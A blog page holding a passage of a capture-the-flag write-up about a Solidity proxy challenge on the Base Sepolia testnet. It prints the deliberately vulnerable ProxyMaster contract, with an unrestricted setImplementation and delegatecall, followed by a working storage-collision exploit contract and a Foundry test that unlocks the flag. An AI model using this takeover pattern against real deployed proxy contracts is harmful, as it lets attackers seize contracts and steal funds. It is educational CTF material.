@@ -1,0 +1,565 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
+<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/ctf/writeup9/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="Security Club of Kimathi CTF"><meta property="og:description" content=" cool and juicy!!* "><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-06-16T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="Security Club of Kimathi CTF"><meta name=twitter:description content=" cool and juicy!!* "><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/ctf/writeup9/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/ctf/writeup9/"><meta property="og:title" content="Security Club of Kimathi CTF"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-06-16T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/ctf/writeup9/"><meta name=twitter:title content="Security Club of Kimathi CTF"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="ctf"><meta name=article:subtitle content="⚡it was a cool ctf and i got various chall' that were very cool and juicy!!⚡"><meta name=article:summary content="* cool and juicy!!*"><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="Security Club of Kimathi CTF"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Ctf","item":"https:\/\/havocsec.me\/ctf/"},{"@type":"ListItem","position":3,"name":"Security Club of Kimathi CTF","item":"https:\/\/havocsec.me\/ctf\/writeup9\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
+<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
+<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
+<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
+</button>
+<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
+</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
+</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
+</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
+</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
+</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">Security Club of Kimathi CTF</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">⚡it was a cool ctf and i got various chall' that were very cool and juicy!!⚡</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Jun 16, 2025 - 10 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/block_hu187187d35b28e7147b759f1ac2bfd087_21324_filter_11492400015018413633.webp alt="feature image" height=490 width=736>
+<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">ctf</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup9/images/qs.png?raw=true" alt=lock></p><h2 id=challenge-description>Challenge Description</h2><p>The challenge, &ldquo;The Phantom&rsquo;s Masquerade,&rdquo; involves a smart contract deployed on Base Sepolia at <code>0x85aD671D00348eA2924e7472A678dD085b4B1Dd4</code>. The goal is to &ldquo;unmask the phantom and reveal its true nature to claim the hidden treasure.&rdquo; The challenge hints point towards <code>delegatecall</code> and storage layout confusion.</p><h2 id=vulnerability-analysis>Vulnerability Analysis</h2><p>The <code>ProxyMaster</code> contract acts as a proxy, forwarding calls to an <code>implementation</code> address using <code>delegatecall</code>. The relevant parts of the <code>ProxyMaster</code> contract are:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>ProxyMaster</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> implementation;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>private</span> unlocked;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>constructor</span>(<span style=color:#66d9ef>address</span> _implementation) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>implementation <span style=color:#f92672>=</span> _implementation;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>execute</span>(<span style=color:#66d9ef>bytes</span> calldata data) <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>bytes</span> <span style=color:#66d9ef>memory</span>) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>(<span style=color:#66d9ef>bool</span> success, <span style=color:#66d9ef>bytes</span> <span style=color:#66d9ef>memory</span> result) <span style=color:#f92672>=</span> implementation.delegatecall(data);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require(success, <span style=color:#e6db74>&#34;Execution failed&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> result;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setImplementation</span>(<span style=color:#66d9ef>address</span> newImpl) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// In a real proxy, this would be restricted
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>implementation <span style=color:#f92672>=</span> newImpl;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getFlag</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>string</span> <span style=color:#66d9ef>memory</span>) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>require(unlocked, <span style=color:#e6db74>&#34;The phantom remains masked, its secrets hidden!&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;***REDACTED***&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isUnlocked</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>bool</span>) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> unlocked; <span style=color:#75715e>// Has the phantom been unmasked?
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The key vulnerability lies in the <code>setImplementation</code> function, which is not restricted and allows anyone to change the <code>implementation</code> address. This, combined with the <code>delegatecall</code> in the <code>execute</code> function, creates a classic proxy vulnerability known as &ldquo;storage collision&rdquo; or &ldquo;storage layout confusion.&rdquo;</p><p>When <code>delegatecall</code> is used, the code of the <code>implementation</code> contract is executed in the context of the <code>ProxyMaster</code> contract. This means that any state variables accessed by the <code>implementation</code> contract will actually modify the storage of the <code>ProxyMaster</code> contract.</p><p>Let&rsquo;s examine the storage layout of <code>ProxyMaster</code>:</p><ul><li><p><code>implementation</code> (address) is at storage slot 0.</p></li><li><p><code>unlocked</code> (bool) is at storage slot 1.</p></li></ul><p>Our goal is to set <code>unlocked</code> to <code>true</code> to call <code>getFlag()</code>.</p><h2 id=exploit-strategy>Exploit Strategy</h2><p>The exploit strategy involves the following steps:</p><ol><li><p>Deploy a malicious <code>ExploitImplementation</code> contract.</p></li><li><p>The <code>ExploitImplementation</code> contract will have a state variable at storage slot 1 that we can control. This variable will overwrite the <code>unlocked</code> variable in the <code>ProxyMaster</code> contract when a <code>delegatecall</code> is made.</p></li><li><p>Call <code>setImplementation</code> on the <code>ProxyMaster</code> contract to point its <code>implementation</code> to our deployed <code>ExploitImplementation</code> contract.</p></li><li><p>Call the <code>execute</code> function on the <code>ProxyMaster</code> contract, passing in the calldata to call a function in our <code>ExploitImplementation</code> that sets its storage slot 1 variable to <code>true</code>.</p></li><li><p>Since <code>delegatecall</code> is used, this will effectively set the <code>unlocked</code> variable in <code>ProxyMaster</code> to <code>true</code>.</p></li><li><p>Finally, call <code>getFlag()</code> on the <code>ProxyMaster</code> contract to retrieve the flag.</p></li></ol><h2 id=exploit-implementation>Exploit Implementation</h2><h3 id=exploitimplementationsol><code>ExploitImplementation.sol</code></h3><p>We create a simple contract <code>ExploitImplementation</code> with a <code>bool</code> variable <code>newUnlocked</code> at storage slot 1 (to align with <code>ProxyMaster</code>&rsquo;s <code>unlocked</code> variable) and a function <code>setUnlocked</code> to modify it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// SPDX-License-Identifier: MIT
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>pragma solidity</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>8</span>.<span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>ExploitImplementation</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> dummy; <span style=color:#75715e>// This will occupy storage slot 0, aligning with &#39;implementation&#39; in ProxyMaster
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>public</span> newUnlocked; <span style=color:#75715e>// This will occupy storage slot 1, aligning with &#39;unlocked&#39; in ProxyMaster
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setUnlocked</span>(<span style=color:#66d9ef>bool</span> _newUnlocked) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>newUnlocked <span style=color:#f92672>=</span> _newUnlocked;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=foundry-test-proxymastertsol>Foundry Test (<code>ProxyMaster.t.sol</code>)</h3><p>To test the exploit locally, we use Foundry. We fork the Base Sepolia network and interact with the deployed <code>ProxyMaster</code> contract.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// SPDX-License-Identifier: MIT
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>pragma solidity</span> <span style=color:#f92672>^</span><span style=color:#ae81ff>0</span>.<span style=color:#ae81ff>8</span>.<span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;forge-std/Test.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;forge-std/console.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;./ProxyMaster.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;./ExploitImplementation.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>ProxyMasterTest</span> <span style=color:#66d9ef>is</span> Test {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ProxyMaster proxyMaster;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ExploitImplementation exploitImplementation;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>address</span> <span style=color:#66d9ef>constant</span> PROXY_ADDRESS <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x85aD671D00348eA2924e7472A678dD085b4B1Dd4</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setUp</span>() <span style=color:#66d9ef>public</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>vm.createSelectFork(<span style=color:#e6db74>&#34;https://sepolia.base.org&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>proxyMaster <span style=color:#f92672>=</span> ProxyMaster(PROXY_ADDRESS);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exploitImplementation <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ExploitImplementation(); <span style=color:#75715e>// Deploy our exploit contract locally
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>testExploit</span>() <span style=color:#66d9ef>public</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>console.log(<span style=color:#e6db74>&#34;Initial unlocked state:&#34;</span>, proxyMaster.isUnlocked());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Step 1: Set the implementation of the proxy to our ExploitImplementation contract
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>proxyMaster.setImplementation(<span style=color:#66d9ef>address</span>(exploitImplementation));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Step 2: Encode the call to setUnlocked(true) from our ExploitImplementation
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>bytes</span> <span style=color:#66d9ef>memory</span> payload <span style=color:#f92672>=</span> abi.encodeWithSelector(exploitImplementation.setUnlocked.selector, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Step 3: Call the execute function on the proxy with the payload
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// This will execute setUnlocked(true) in the context of ProxyMaster, modifying its &#39;unlocked&#39; state variable
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>proxyMaster.execute(payload);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>console.log(<span style=color:#e6db74>&#34;Final unlocked state:&#34;</span>, proxyMaster.isUnlocked());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Step 4: Verify that the unlocked variable in ProxyMaster is now true
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>assertTrue(proxyMaster.isUnlocked(), <span style=color:#e6db74>&#34;Proxy should be unlocked&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Step 5: Get the flag
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>string</span> <span style=color:#66d9ef>memory</span> flag <span style=color:#f92672>=</span> proxyMaster.getFlag();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>emit log_string(flag);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=execution-steps-and-terminal-outputs>Execution Steps and Terminal Outputs</h2><p>Here are the terminal outputs for each significant step of the exploit. You can use these to create your own screenshots if desired.</p><h3 id=1-initializing-foundry-project>1. Initializing Foundry Project</h3><pre tabindex=0><code>
